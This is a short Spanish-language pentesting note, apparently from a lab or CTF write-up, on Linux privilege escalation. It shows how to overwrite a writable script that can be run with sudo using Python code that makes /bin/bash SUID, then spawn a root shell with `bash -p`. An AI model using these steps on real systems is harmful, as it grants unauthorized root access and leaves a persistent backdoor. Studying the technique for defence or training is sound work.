Haciendo `sudo -l`, vemos los ficheros ejecutables sobre los que el usuarios con el que hemos entrado a un equipo puede ejecutar como el usuario root. Teniendo sus privilegios.

Si además, tenemos privilegios de escritura sobre el script que podemos ejecutar como root, podemos cambiar su contenido para que cambie el binario '/bin/bash' y hacerlo SUID.

Ejemplo en un fichero python:
> Borramos su contenido y creamos el propio.
```
import os

os.system("chmod 4775 /bin/bash")
```

Ejecutamos el script con sudo --> `sudo /usr/bin/python3 /opt/apache-activemq-5.9.0/subscribe.py`
Posteriormente sólo tendremos que ejecutar una bash --> `bash -p`
Seremos el usuario root.